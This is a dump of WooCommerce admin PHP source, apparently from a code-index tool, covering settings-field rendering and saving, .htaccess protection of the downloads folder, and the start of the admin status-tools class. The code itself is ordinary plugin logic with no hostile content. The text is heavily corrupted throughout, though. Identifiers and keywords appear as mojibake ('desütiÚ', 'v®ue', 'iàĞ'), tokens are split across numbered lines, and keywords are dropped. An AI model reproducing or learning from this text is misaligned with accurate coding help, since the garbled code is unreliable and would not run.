 ( 
$desütiÚ
 ) {

233 
$desütiÚ
 = '<¥ª cÏss="desütiÚ">' . 
	`wp_k£s_po¡
( $description ) . '</span>';

236 iàĞ
$t
 && 
	`š_¬¿y
Ğ
$v®ue
['ty³'], 
	`¬¿y
( 'checkbox' ) ) ) {

238 
$t
 = '<p class="description">' . $tip . '</p>';

240 } 
	`–£if
 ( 
$t
 ) {

242 
$t
 = '<img cÏss="h–p_t" d©a-t="' . 
	`esc_©Œ
Ğ$t ) . '" src="' . 
	`WC
()->
	`¶ugš_u¾
() . '/assets/images/help.png" height="16" width="16" />';

247  
$v®ue
['type'] ) {

251 iàĞ! 
	`em±y
Ğ
$v®ue
['title'] ) ) {

252 
echo
 '<h3>' . 
	`esc_html
Ğ
$v®ue
['title'] ) . '</h3>';

254 iàĞ! 
	`em±y
Ğ
$v®ue
['desc'] ) ) {

255 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
	`wp_k£s_po¡
Ğ
$v®ue
['desc'] ) ) );

257 
echo
 '<table class="form-table">'. "\n\n";

258 iàĞ! 
	`em±y
Ğ
$v®ue
['id'] ) ) {

259 
	`do_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
	`§n™ize_t™Ë
Ğ
$v®ue
['id'] ) );

265 iàĞ! 
	`em±y
Ğ
$v®ue
['id'] ) ) {

266 
	`do_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
	`§n™ize_t™Ë
Ğ
$v®ue
['id'] ) . '_end' );

268 
echo
 '</table>';

269 iàĞ! 
	`em±y
Ğ
$v®ue
['id'] ) ) {

270 
	`do_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
	`§n™ize_t™Ë
Ğ
$v®ue
['id'] ) . '_after' );

281 
$ty³
 = 
$v®ue
['type'];

282 
$şass
 = '';

283 
$İtiÚ_v®ue
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'], $value['default'] );

285 iàĞ
$v®ue
['type'] == 'color' ) {

286 
$ty³
 = 'text';

287 
$v®ue
['class'] .= 'colorpick';

288 
$desütiÚ
 .ğ'<div id="cŞÜPick”Div_' . 
	`esc_©Œ
Ğ
$v®ue
['id'] ) . '" class="colorpickdiv" style="z-index: 100;background:#eee;border:1px solid #ccc;position:absolute;display:none;"></div>';

291 ?><
Œ
 
v®ign
="top">

292 <
th
 
scİe
="row" 
şass
="titledesc">

293 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ); ?></label>

294 <?
php
 
echo
 
$t
; ?>

295 </
th
>

296 <
td
 
şass
="forminp forminp-<?phpƒcho sanitize_title( $value['type'] ) ?>">

297 <
šput


298 
Çme
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

299 
id
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

300 
ty³
="<?phpƒchoƒsc_attr( $type ); ?>"

301 
¡yË
="<?phpƒchoƒsc_attr( $value['css'] ); ?>"

302 
v®ue
="<?phpƒchoƒsc_attr( $option_value ); ?>"

303 
şass
="<?phpƒchoƒsc_attr( $value['class'] ); ?>"

304 <?
php
 
echo
 
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ); ?>

305 /> <?
php
 
echo
 
$desütiÚ
; ?>

306 </
td
>

307 </
Œ
><?
php


313 
$İtiÚ_v®ue
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'], $value['default'] );

315 ?><
Œ
 
v®ign
="top">

316 <
th
 
scİe
="row" 
şass
="titledesc">

317 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ); ?></label>

318 <?
php
 
echo
 
$t
; ?>

319 </
th
>

320 <
td
 
şass
="forminp forminp-<?phpƒcho sanitize_title( $value['type'] ) ?>">

321 <?
php
 
echo
 
$desütiÚ
; ?>

323 <
‹x»a


324 
Çme
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

325 
id
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

326 
¡yË
="<?phpƒchoƒsc_attr( $value['css'] ); ?>"

327 
şass
="<?phpƒchoƒsc_attr( $value['class'] ); ?>"

328 <?
php
 
echo
 
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ); ?>

329 ><?
php
 
echo
 
	`esc_‹x»a
Ğ
$İtiÚ_v®ue
 ); ?></
‹x»a
>

330 </
td
>

331 </
Œ
><?
php


338 
$İtiÚ_v®ue
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'], $value['default'] );

340 ?><
Œ
 
v®ign
="top">

341 <
th
 
scİe
="row" 
şass
="titledesc">

342 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ); ?></label>

343 <?
php
 
echo
 
$t
; ?>

344 </
th
>

345 <
td
 
şass
="forminp forminp-<?phpƒcho sanitize_title( $value['type'] ) ?>">

346 <
£Ëù


347 
Çme
="<?phpƒchoƒsc_attr( $value['id'] ); ?><?php if ( $value['type'] == 'multiselect' )ƒcho '[]'; ?>"

348 
id
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

349 
¡yË
="<?phpƒchoƒsc_attr( $value['css'] ); ?>"

350 
şass
="<?phpƒchoƒsc_attr( $value['class'] ); ?>"

351 <?
php
 
echo
 
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ); ?>

352 <?
php
 iàĞ
$v®ue
['ty³'] =ğ'muÉi£Ëù' ) 
echo
 'multiple="multiple"'; ?>

354 <?
php


355 
	`fÜ—ch
 ( 
$v®ue
['İtiÚs'] 
as
 
$key
 => 
$v®
 ) {

357 <
İtiÚ
 
v®ue
="<?ph°echØesc_©ŒĞ$key ); ?>" <?
php


359 iàĞ
	`is_¬¿y
Ğ
$İtiÚ_v®ue
 ) )

360 
	`£Ëùed
Ğ
	`š_¬¿y
Ğ
$key
, 
$İtiÚ_v®ue
 ), 
Œue
 );

362 
	`£Ëùed
Ğ
$İtiÚ_v®ue
, 
$key
 );

364 ?>><?
php
 
echo
 
$v®
 ?></
İtiÚ
>

365 <?
php


368 </
£Ëù
> <?
php
 
echo
 
$desütiÚ
; ?>

369 </
td
>

370 </
Œ
><?
php


376 
$İtiÚ_v®ue
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'], $value['default'] );

378 ?><
Œ
 
v®ign
="top">

379 <
th
 
scİe
="row" 
şass
="titledesc">

380 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ); ?></label>

381 <?
php
 
echo
 
$t
; ?>

382 </
th
>

383 <
td
 
şass
="forminp forminp-<?phpƒcho sanitize_title( $value['type'] ) ?>">

384 <
f›ld£t
>

385 <?
php
 
echo
 
$desütiÚ
; ?>

386 <
ul
>

387 <?
php


388 
	`fÜ—ch
 ( 
$v®ue
['İtiÚs'] 
as
 
$key
 => 
$v®
 ) {

390 <
li
>

391 <
Ïb–
><
šput


392 
Çme
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

393 
v®ue
="<?phpƒcho $key; ?>"

394 
ty³
="radio"

395 
¡yË
="<?phpƒchoƒsc_attr( $value['css'] ); ?>"

396 
şass
="<?phpƒchoƒsc_attr( $value['class'] ); ?>"

397 <?
php
 
echo
 
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ); ?>

398 <?
php
 
	`checked
Ğ
$key
, 
$İtiÚ_v®ue
 ); ?>

399 /> <?
php
 
echo
 
$v®
 ?></
Ïb–
>

400 </
li
>

401 <?
php


404 </
ul
>

405 </
f›ld£t
>

406 </
td
>

407 </
Œ
><?
php


413 
$İtiÚ_v®ue
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'], $value['default'] );

414 
$visb™y_şass
 = 
	`¬¿y
();

416 iàĞ! 
	`is£t
Ğ
$v®ue
['hide_if_checked'] ) ) {

417 
$v®ue
['hide_if_checked'] = 
çl£
;

419 iàĞ! 
	`is£t
Ğ
$v®ue
['show_if_checked'] ) ) {

420 
$v®ue
['show_if_checked'] = 
çl£
;

422 iàĞ
$v®ue
['hide_if_checked'] == 'yes' || $value['show_if_checked'] == 'yes' ) {

423 
$visb™y_şass
[] = 'hidden_option';

425 iàĞ
$v®ue
['hide_if_checked'] == 'option' ) {

426 
$visb™y_şass
[] = 'hide_options_if_checked';

428 iàĞ
$v®ue
['show_if_checked'] == 'option' ) {

429 
$visb™y_şass
[] = 'show_options_if_checked';

432 iàĞ! 
	`is£t
Ğ
$v®ue
['checkboxgroup'] ) || 'start' == $value['checkboxgroup'] ) {

434 <
Œ
 
v®ign
="tİ" 
şass
="<?phpƒchoƒsc_attr( implode( ' ', $visbility_class ) ); ?>">

435 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ) ?></th>

436 <
td
 
şass
="forminp forminp-checkbox">

437 <
f›ld£t
>

438 <?
php


441 <
f›ld£t
 
şass
="<?phpƒchoƒsc_attr( implode( ' ', $visbility_class ) ); ?>">

442 <?
php


445 iàĞ! 
	`em±y
Ğ
$v®ue
['title'] ) ) {

447 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ) ?></span></legend>

448 <?
php


452 <
Ïb–
 ="<?phpƒcho $value['id'] ?>">

453 <
šput


454 
Çme
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

455 
id
="<?phpƒchoƒsc_attr( $value['id'] ); ?>"

456 
ty³
="checkbox"

457 
v®ue
="1"

458 <?
php
 
	`checked
Ğ
$İtiÚ_v®ue
, 'yes'); ?>

459 <?
php
 
echo
 
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 ); ?>

460 /> <?
php
 
echo
 
$desütiÚ
 ?>

461 </
Ïb–
> <?
php
 
echo
 
$t
; ?>

462 <?
php


464 iàĞ! 
	`is£t
Ğ
$v®ue
['checkboxgroup'] ) || 'end' == $value['checkboxgroup'] ) {

466 </
f›ld£t
>

467 </
td
>

468 </
Œ
>

469 <?
php


472 </
f›ld£t
>

473 <?
php


480 
$width
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'] . '[width]', $value['default']['width'] );

481 
$height
 = 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'] . '[height]', $value['default']['height'] );

482 
$üİ
 = 
	`checked
Ğ1, 
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'] . '[üİ]', $v®ue['deçuÉ']['üİ'] ), 
çl£
 );

484 ?><
Œ
 
v®ign
="top">

485 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['t™Ë'] ) ?> <?ph°echØ
$t
; ?></th>

486 <
td
 
şass
="forminp image_width_settings">

488 <
šput
 
Çme
="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>[width]" 
id
="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>-width" 
ty³
="‹xt" 
size
="3" 
v®ue
="<?ph°echØ$width; ?>" /> &
times
; <špuˆÇme="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>[height]" id="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>-height"y³="‹xt" size="3" v®ue="<?ph°echØ$height; ?>" />
px


490 <
Ïb–
><
šput
 
Çme
="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>[üİ]" 
id
="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>-üİ" 
ty³
="checkbox" <?
php
 
echo
 
$üİ
; ?> /> <?ph°
	`_e
( 'Hard Crop?', 'woocommerce' ); ?></label>

492 </
td
>

493 </
Œ
><?
php


499 
$¬gs
 = 
	`¬¿y
Ğ'Çme' => 
$v®ue
['id'],

500 'id' => 
$v®ue
['id'],

504 'şass' => 
$v®ue
['class'],

505 'echo' => 
çl£
,

506 '£Ëùed' => 
	`absšt
Ğ
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'] ) )

509 ifĞ
	`is£t
Ğ
$v®ue
['args'] ) )

510 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ
$v®ue
['args'], $args );

512 ?><
Œ
 
v®ign
="tİ" 
şass
="single_select_page">

513 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['t™Ë'] ) ?> <?ph°echØ
$t
; ?></th>

514 <
td
 
şass
="forminp">

515 <?
php
 
echo
 
	`¡r_»¶aû
(' id=', " d©a-¶aûhŞd”='" . 
	`__
Ğ'S–eù‡…age&h–l;', 'woocomm”û' ) . "' styË='" . 
$v®ue
['css'] . "' cÏss='" . $v®ue['şass'] . "' id=", 
	`wp_drİdown_·ges
Ğ
$¬gs
 ) ); ?> <?ph°echØ
$desütiÚ
; ?>

516 </
td
>

517 </
Œ
><?
php


522 
$couÁry_£‰šg
 = (
¡ršg
è
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'] );

523 
$couÁr›s
 = 
	`WC
()->
couÁr›s
->countries;

525 iàĞ
	`¡r¡r
Ğ
$couÁry_£‰šg
, ':' ) ) {

526 
$couÁry_£‰šg
 = 
	`ex¶ode
( ':', $country_setting );

527 
$couÁry
 = 
	`cu¼’t
Ğ
$couÁry_£‰šg
 );

528 
$¡©e
 = 
	`’d
Ğ
$couÁry_£‰šg
 );

530 
$couÁry
 = 
$couÁry_£‰šg
;

531 
$¡©e
 = '*';

533 ?><
Œ
 
v®ign
="top">

534 <
th
 
scİe
="row" 
şass
="titledesc">

535 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ); ?></label>

536 <?
php
 
echo
 
$t
; ?>

537 </
th
>

538 <
td
 
şass
="fÜmšp"><
£Ëù
 
Çme
="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$v®ue['css'] ); ?>" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'Choo£‡ couÁry&h–l;', 'woocomm”û' ); ?>" 
t™Ë
="Country" class="chosen_select">

539 <?
php
 
	`WC
()->
couÁr›s
->
	`couÁry_drİdown_İtiÚs
Ğ
$couÁry
, 
$¡©e
 ); ?>

540 </
£Ëù
> <?
php
 
echo
 
$desütiÚ
; ?>

541 </
td
>

542 </
Œ
><?
php


548 
$£ËùiÚs
 = (
¬¿y
è
£lf
::
	`g‘_İtiÚ
Ğ
$v®ue
['id'] );

550 iàĞ! 
	`em±y
Ğ
$v®ue
['options'] ) )

551 
$couÁr›s
 = 
$v®ue
['options'];

553 
$couÁr›s
 = 
	`WC
()->
couÁr›s
->countries;

555 
	`asÜt
Ğ
$couÁr›s
 );

556 ?><
Œ
 
v®ign
="top">

557 <
th
 
scİe
="row" 
şass
="titledesc">

558 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>"><?
php
 
echo
 
	`esc_html
Ğ
$v®ue
['title'] ); ?></label>

559 <?
php
 
echo
 
$t
; ?>

560 </
th
>

561 <
td
 
şass
="forminp">

562 <
£Ëù
 
muÉË
="muÉË" 
Çme
="<?ph°echØesc_©ŒĞ$v®ue['id'] ); ?>[]" 
¡yË
="width:350px" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'Choo£ couÁr›s&h–l;', 'woocomm”û' ); ?>" 
t™Ë
="CouÁry" 
şass
="chosen_select">

563 <?
php


564 iàĞ
$couÁr›s
 )

565 
	`fÜ—ch
 ( 
$couÁr›s
 
as
 
$key
 => 
$v®
 )

566 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '" ' . 
	`£Ëùed
Ğ
	`š_¬¿y
Ğ$key, 
$£ËùiÚs
 ), 
Œue
, 
çl£
 ).'>' . 
$v®
 . '</option>';

568 </
£Ëù
> <?
php
 iàĞ
$desütiÚ
 ) 
echo
 $desütiÚ; ?> </
br
><
a
 
şass
="£Ëù_®Èbu‰Ú" 
h»f
="#"><?ph°
	`_e
( 'Select‡ll', 'woocommerce' ); ?></a> <a class="select_none button" href="#"><?php _e( 'Select‚one', 'woocommerce' ); ?></a>

569 </
td
>

570 </
Œ
><?
php


575 
	`do_aùiÚ
Ğ'woocomm”û_admš_f›ld_' . 
$v®ue
['type'], $value );

579 
	}
}

590 
public
 
funùiÚ
 
	$§ve_f›lds
Ğ
$İtiÚs
 ) {

591 iàĞ
	`em±y
Ğ
$_POST
 ) )

592  
çl£
;

595 
$upd©e_İtiÚs
 = 
	`¬¿y
();

598 
	`fÜ—ch
 ( 
$İtiÚs
 
as
 
$v®ue
 ) {

600 iàĞ! 
	`is£t
Ğ
$v®ue
['id'] ) )

603 
$ty³
 = 
	`is£t
Ğ
$v®ue
['ty³'] ) ? 
	`§n™ize_t™Ë
( $value['type'] ) : '';

606 
$İtiÚ_v®ue
 = 
nuÎ
;

608  
$ty³
 ) {

613 iàĞ
	`is£t
Ğ
$_POST
[ 
$v®ue
['id'] ] ) ) {

614 
$İtiÚ_v®ue
 = 'yes';

616 
$İtiÚ_v®ue
 = 'no';

623 iàĞ
	`is£t
Ğ
$_POST
[
$v®ue
['id']] ) ) {

624 
$İtiÚ_v®ue
 = 
	`wp_k£s_po¡
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$v®ue
['id'] ] ) ) );

626 
$İtiÚ_v®ue
 = '';

641 iàĞ
$v®ue
['id'] == 'woocommerce_price_thousand_sep' || $value['id'] == 'woocommerce_price_decimal_sep' ) {

644 iàĞ
	`is£t
Ğ
$_POST
[ 
$v®ue
['id'] ] ) ) {

645 
$İtiÚ_v®ue
 = 
	`wp_k£s_po¡
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$v®ue
['id'] ] ) );

647 
$İtiÚ_v®ue
 = '';

650 } 
	`–£if
 ( 
$v®ue
['id'] == 'woocommerce_price_num_decimals' ) {

653 iàĞ
	`is£t
Ğ
$_POST
[ 
$v®ue
['id'] ] ) ) {

654 
$İtiÚ_v®ue
 = 
	`absšt
Ğ
$_POST
[ 
$v®ue
['id'] ] );

656 
$İtiÚ_v®ue
 = 2;

659 } 
	`–£if
 ( 
$v®ue
['id'] == 'woocommerce_hold_stock_minutes' ) {

662 iàĞ! 
	`em±y
Ğ
$_POST
[ 
$v®ue
['id'] ] ) ) {

663 
$İtiÚ_v®ue
 = 
	`absšt
Ğ
$_POST
[ 
$v®ue
['id'] ] );

665 
$İtiÚ_v®ue
 = '';

668 
	`wp_ş—r_scheduËd_hook
( 'woocommerce_cancel_unpaid_orders' );

670 iàĞ
$İtiÚ_v®ue
 != '' )

671 
	`wp_scheduË_sšgË_ev’t
Ğ
	`time
(è+ ( 
	`absšt
Ğ
$İtiÚ_v®ue
 ) * 60 ), 'woocommerce_cancel_unpaid_orders' );

675 iàĞ
	`is£t
Ğ
$_POST
[
$v®ue
['id']] ) ) {

676 
$İtiÚ_v®ue
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$v®ue
['id'] ] ) );

678 
$İtiÚ_v®ue
 = '';

690 iàĞ
	`is£t
Ğ
$_POST
[ 
$v®ue
['id'] ] ) )

691 
$£Ëùed_couÁr›s
 = 
	`¬¿y_m­
Ğ'wc_ş—n',‡¼ay_m­Ğ'¡r¦ashes', (
¬¿y
è
$_POST
[ 
$v®ue
['id'] ] ) );

693 
$£Ëùed_couÁr›s
 = 
	`¬¿y
();

695 
$İtiÚ_v®ue
 = 
$£Ëùed_couÁr›s
;

701 iàĞ
	`is£t
Ğ
$_POST
[
$v®ue
['id'] ]['width'] ) ) {

703 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['width'] = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_POST
[ $value['id'] ]['width'] ) );

704 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['height'] = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_POST
[ $value['id'] ]['height'] ) );

706 iàĞ
	`is£t
Ğ
$_POST
[ 
$v®ue
['id'] ]['crop'] ) )

707 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['crop'] = 1;

709 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['crop'] = 0;

712 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['width'] = $value['default']['width'];

713 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['height'] = $value['default']['height'];

714 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ]['crop'] = $value['default']['crop'];

722 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚ_' . 
$ty³
, 
$v®ue
 );

728 iàĞ! 
	`is_nuÎ
Ğ
$İtiÚ_v®ue
 ) ) {

730 iàĞ
	`¡r¡r
Ğ
$v®ue
['id'], '[' ) ) {

732 
	`·r£_¡r
Ğ
$v®ue
['id'], 
$İtiÚ_¬¿y
 );

735 
$İtiÚ_Çme
 = 
	`cu¼’t
Ğ
	`¬¿y_keys
Ğ
$İtiÚ_¬¿y
 ) );

738 iàĞ! 
	`is£t
Ğ
$upd©e_İtiÚs
[ 
$İtiÚ_Çme
 ] ) )

739 
$upd©e_İtiÚs
[ 
$İtiÚ_Çme
 ] = 
	`g‘_İtiÚ
Ğ$İtiÚ_Çme, 
	`¬¿y
() );

741 iàĞ! 
	`is_¬¿y
Ğ
$upd©e_İtiÚs
[ 
$İtiÚ_Çme
 ] ) )

742 
$upd©e_İtiÚs
[ 
$İtiÚ_Çme
 ] = 
	`¬¿y
();

745 
$key
 = 
	`key
Ğ
$İtiÚ_¬¿y
[ 
$İtiÚ_Çme
 ] );

747 
$upd©e_İtiÚs
[ 
$İtiÚ_Çme
 ][ 
$key
 ] = 
$İtiÚ_v®ue
;

751 
$upd©e_İtiÚs
[ 
$v®ue
['id'] ] = 
$İtiÚ_v®ue
;

756 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚ', 
$v®ue
 );

760 
	`fÜ—ch
Ğ
$upd©e_İtiÚs
 
as
 
$Çme
 => 
$v®ue
 )

761 
	`upd©e_İtiÚ
Ğ
$Çme
, 
$v®ue
 );

763  
Œue
;

764 
	}
}

774 
public
 
funùiÚ
 
	$check_dowÆßd_fŞd”_´ÙeùiÚ
() {

775 
$u¶ßd_dœ
 = 
	`wp_u¶ßd_dœ
();

776 
$dowÆßds_u¾
 = 
$u¶ßd_dœ
['basedir'] . '/woocommerce_uploads';

777 
$dowÆßd_m‘hod
 = 
	`g‘_İtiÚ
('woocommerce_file_download_method');

779 iàĞ
$dowÆßd_m‘hod
 == 'redirect' ) {

782 iàĞ
	`fe_exi¡s
Ğ
$dowÆßds_u¾
 . '/.htaccess' ) )

783 
	`uÆšk
Ğ
$dowÆßds_u¾
 . '/.htaccess' );

788 iàĞ! 
	`fe_exi¡s
Ğ
$dowÆßds_u¾
 . '/.htaccess' ) ) {

789 iàĞ
$fe_hªdË
 = @
	`fİ’
Ğ
$dowÆßds_u¾
 . '/.htaccess', 'w' ) ) {

790 
	`fwr™e
Ğ
$fe_hªdË
, 'deny from‡ll' );

791 
	`fşo£
Ğ
$fe_hªdË
 );

795 
	}
}

798 
	g’dif
;

	@includes/admin/class-wc-admin-status.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Status' ) ) :

18 şas 
	cWC_Admš_Stus
 {

23 
public
 
funùiÚ
 
	$ouut
() {

24 
$cu¼’t_b
 = ! 
	`em±y
Ğ
$_REQUEST
['b'] ) ? 
	`§n™ize_t™Ë
( $_REQUEST['tab'] ) : 'status';

26 
	`šşude_Úû
( 'views/html-admin-page-status.php' );

32 
public
 
funùiÚ
 
	$¡©us_»pÜt
() {

33 
glob®
 
$woocomm”û
, 
$wpdb
;

35 
	`šşude_Úû
( 'views/html-admin-page-status-report.php' );

36 
	}
}

41 
public
 
funùiÚ
 
	$¡©us_toŞs
() {

42 
glob®
 
$woocomm”û
, 
$wpdb
;

44 
$toŞs
 = 
$this
->
	`g‘_toŞs
();

46 iàĞ! 
	`em±y
Ğ
$_GET
['aùiÚ'] ) && !ƒm±yĞ
$_REQUEST
['_w²Úû'] ) && 
	`wp_v”ify_nÚû
( $_REQUEST['_wpnonce'], 'debug_action' ) ) {

48  
$_GET
['action'] ) {

50 
	`wc_d–‘e_´oduù_Œªs›Ás
();

52 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'Product Transients Cleared', 'woocommerce' ) . '</p></div>';

57 
$rows
 = 
$wpdb
->
	`qu”y
( "

58 
DELETE


59 
a
, 
b


60 
FROM


61 {
$wpdb
->
İtiÚs
} 
a
, {$wpdb->İtiÚs} 
b


62 
WHERE


63 
a
.
İtiÚ_Çme
 
LIKE
 '_Œªs›Á_%' 
AND


64 
a
.
İtiÚ_Çme
 
NOT
 
LIKE
 '_Œªs›Á_timeout_%' 
AND


65 
b
.
İtiÚ_Çme
 = 
	`CONCAT
(

67 
	`SUBSTRING
(

68 
a
.
İtiÚ_Çme
,

69 
	`CHAR_LENGTH
('_transient_') + 1

72 
AND
 
b
.
İtiÚ_v®ue
 < 
	`UNIX_TIMESTAMP
()

75 
$rows2
 = 
$wpdb
->
	`qu”y
( "

76 
DELETE


77 
a
, 
b


78 
FROM


79 {
$wpdb
->
İtiÚs
} 
a
, {$wpdb->İtiÚs} 
b


80 
WHERE


81 
a
.
İtiÚ_Çme
 
LIKE
 '_s™e_Œªs›Á_%' 
AND


82 
a
.
İtiÚ_Çme
 
NOT
 
LIKE
 '_s™e_Œªs›Á_timeout_%' 
AND


83 
b
.
İtiÚ_Çme
 = 
	`CONCAT
(

85 
	`SUBSTRING
(

86 
a
.
İtiÚ_Çme
,

87 
	`CHAR_LENGTH
('_site_transient_') + 1

90 
AND
 
b
.
İtiÚ_v®ue
 < 
	`UNIX_TIMESTAMP
()

93 
echo
 '<div cÏss="upd©ed"><p>' . 
	`¥rštf
Ğ
	`__
Ğ'%d T¿ns›Á Row CË¬ed', 'woocomm”û' ), 
$rows
 + 
$rows2
 ) . '</p></div>';

98 
$š¡®Ër
 = 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/class-wc-install.php' );

99 
$š¡®Ër
->
	`»move_rŞes
();

100 
$š¡®Ër
->
	`ü—‹_rŞes
();

102 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'Roles successfully„eset', 'woocommerce' ) . '</p></div>';

106 
$´oduù_ÿts
 = 
	`g‘_‹rms
Ğ'´oduù_ÿt', 
	`¬¿y
Ğ'hide_em±y' => 
çl£
, 'fields' => 'id=>parent' ) );

108 
	`_wc_‹rm_»couÁ
Ğ
$´oduù_ÿts
, 
	`g‘_xÚomy
Ğ'´oduù_ÿt' ), 
Œue
, 
çl£
 );

110 
$´oduù_gs
 = 
	`g‘_‹rms
Ğ'´oduù_g', 
	`¬¿y
Ğ'hide_em±y' => 
çl£
, 'fields' => 'id=>parent' ) );

112 
	`_wc_‹rm_»couÁ
Ğ
$´oduù_gs
, 
	`g‘_xÚomy
Ğ'´oduù_g' ), 
Œue
, 
çl£
 );

114 
	`d–‘e_Œªs›Á
( 'wc_term_counts' );

116 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'Terms successfully„ecounted', 'woocommerce' ) . '</p></div>';

120 
$wpdb
->
	`qu”y
( "

121 
DELETE
 
FROM
 {
$wpdb
->
İtiÚs
}

122 
WHERE
 
İtiÚ_Çme
 
LIKE
 '_wc_£ssiÚ_%' 
OR
 option_name LIKE '_wc_session_expires_%'

125 
	`wp_ÿche_æush
();

127 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'Sessions successfully cleared', 'woocommerce' ) . '</p></div>';

130 
WC_In¡®l
::
	`ü—‹_·ges
();

131 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'All missing WooCommerce…ages was installed successfully.', 'woocommerce' ) . '</p></div>';

135 
$wpdb
->
	`qu”y
Ğ"TRUNCATE " . $wpdb->
´efix
 . "woocommerce_tax_rates" );

137 
$wpdb
->
	`qu”y
Ğ"TRUNCATE " . $wpdb->
´efix
 . "woocommerce_tax_rate_locations" );

139 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'Tax„ates successfully deleted', 'woocommerce' ) . '</p></div>';

142 
$aùiÚ
 = 
	`esc_©Œ
Ğ
$_GET
['action'] );

143 ifĞ
	`is£t
Ğ
$toŞs
[ 
$aùiÚ
 ]['callback'] ) ) {

144 
$ÿÎback
 = 
$toŞs
[ 
$aùiÚ
 ]['callback'];

145 
$»tuº
 = 
	`ÿÎ_u£r_func
Ğ
$ÿÎback
 );

146 ifĞ
$»tuº
 ==ğ
çl£
 ) {

147 ifĞ
	`is_¬¿y
Ğ
$ÿÎback
 ) ) {

148 
echo
 '<div cÏss="”rÜ"><p>' . 
	`¥rštf
Ğ
	`__
Ğ'Th”wa ªƒ¼Ü c®lšg %s::%s', 'woocomm”û' ), 
	`g‘_şass
Ğ
$ÿÎback
[0] ), $callback[1] ) . '</p></div>';

151 
echo
 '<div cÏss="”rÜ"><p>' . 
	`¥rštf
Ğ
	`__
Ğ'Th”wa ªƒ¼Ü c®lšg %s', 'woocomm”û' ), 
$ÿÎback
 ) . '</p></div>';

160 iàĞ
	`is£t
Ğ
$_REQUEST
